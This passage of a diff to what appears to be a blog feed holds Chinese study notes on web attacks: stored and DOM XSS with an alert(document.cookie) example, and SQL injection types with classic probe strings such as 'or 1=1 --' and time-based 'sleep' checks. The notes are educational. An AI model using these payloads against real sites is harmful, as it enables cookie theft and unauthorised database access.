+<li>存储型【持久】：（一般用于论坛留言，评论，日志）将攻击脚本存储于服务器，受害者查看页面时执行</li>
+<li>DOM型（文档对象模型）：针对web中的JavaScript代码的逻辑漏洞而执行攻击脚本</li>
+</ol>
+</li>
+<li>常用利用方法<ol>
+<li>Cookie窃取 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);&lt;<span class="regexp">/script&gt;	/</span><span class="regexp">/visit:document.cookie to GetCookie</span></span><br></pre></td></tr></table></figure></li>
+<li>会话劫持</li>
+<li>钓鱼：通过执行JavaScript代码动态生成页面内容或直接注入HTML代码（比传统钓鱼更具隐蔽性）</li>
+<li>信息刺探：访问并窃取历史信息、端口信息、剪切板、IP、键盘信息等request对象</li>
+<li>网页挂马</li>
+<li>xss蠕虫：一般用存储型将恶意代码保存于服务器<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2></li>
+</ol>
+</li>
+<li>注入条件：<ul>
+<li>用户能够控制输入</li>
+<li>原本程序要执行的sql语句，拼接了用户输入数据</li>
+</ul>
+</li>
+<li>常用SQL注入<ol>
+<li>Mysql <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 字段名 from 表名 where 条件 order by i limit m.n /*select一般语句*/</span><br></pre></td></tr></table></figure></li>
+<li>php程序调用函数执行sql语句功能 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxx? id=&quot;select * from users where id=$id and pass=&#x27;&quot;.$pass.&quot;&#x27;&quot;; &amp;pwd=</span><br></pre></td></tr></table></figure></li>
+</ol>
+</li>
+<li>注入类型分类<ol>
+<li>按注入点类型<ol>
+<li>数字型（整型）<ul>
+<li>注入点类型为数字（整型），不需要使用引号闭合 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;9 or 1=1 --&quot;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>字符型<ul>
+<li>一般需要使用引号（单、双）满足sql语句引号闭合语法要求  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;xx&#x27; or 1=1 --&quot;  --&quot;xx&quot;：任意值 ; &quot;--&quot;：注释符</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>搜索型</li>
+</ol>
+</li>
+<li>按注入技术（执行效果）分类<ol>
+<li>基于布尔的盲注<ul>
+<li>在输入值后拼接布尔表达式（真值为0或1），通过<strong>回显信息的不同</strong>判断，某个参数是否为注入点 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*1=1:真值为true*/</span><br><span class="line">id = 3005 and 1=1 &amp; pass= test</span><br><span class="line">/*1=2:真值为false*/</span><br><span class="line">id = 3005 and 1=2 &amp; pass= test</span><br><span class="line">/*若回显信息不同，则$id为注入点*/</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>基于时间的盲注<ul>
+<li>使用一些时间函数，如延迟函数slee() <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=3005 and sleep(3) &amp;pass=test</span><br><span class="line">/* web应用延迟3秒后显示登录失败，则$id注入点 */</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>基于报错的注入<ul>
+<li>在php调用函数<code>？</code>后输入错误验证传递，观察错误信息中显示出的对应数据库函数，可判断数据库类型</li>
+</ul>
+</li>
+<li>联合查询注入</li>
+<li>堆查询注入</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>常用判断&#x2F;查找注入点<ol>
+<li>经典：<ul>
+<li>and 1&#x3D;1 </li>
+<li>and 2&gt;1 </li>
+<li>or 1&#x3D;1 </li>
+<li>or 1&lt;1</li>
+</ul>
+</li>
+<li>数据库函数：<ul>
+<li>and sleep(4)&#x3D;1 </li>
+<li>and length(user())&gt;3</li>
+</ul>
+</li>
+<li>特殊符号：<ul>
+<li>单引号（’）</li>
+<li>双引号（”）<h1 id="六、恶意代码"><a href="#六、恶意代码" class="headerlink" title="六、恶意代码"></a>六、恶意代码</h1><h1 id="七、假消息攻击"><a href="#七、假消息攻击" class="headerlink" title="七、假消息攻击"></a>七、假消息攻击</h1><h1 id="八、拒绝服务攻击"><a href="#八、拒绝服务攻击" class="headerlink" title="八、拒绝服务攻击"></a>八、拒绝服务攻击</h1><h1 id="九、防御"><a href="#九、防御" class="headerlink" title="九、防御"></a>九、防御</h1><h1 id="十、访问控制机制"><a href="#十、访问控制机制" class="headerlink" title="十、访问控制机制"></a>十、访问控制机制</h1><h1 id="十一、防火墙"><a href="#十一、防火墙" class="headerlink" title="十一、防火墙"></a>十一、防火墙</h1><h1 id="十二、网络安全监控"><a href="#十二、网络安全监控" class="headerlink" title="十二、网络安全监控"></a>十二、网络安全监控</h1><h1 id="十三、追踪溯源"><a href="#十三、追踪溯源" class="headerlink" title="十三、追踪溯源"></a>十三、追踪溯源</h1></li>
+</ul>
+</li>
+</ol>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
       </tags>
   </entry>
   <entry>
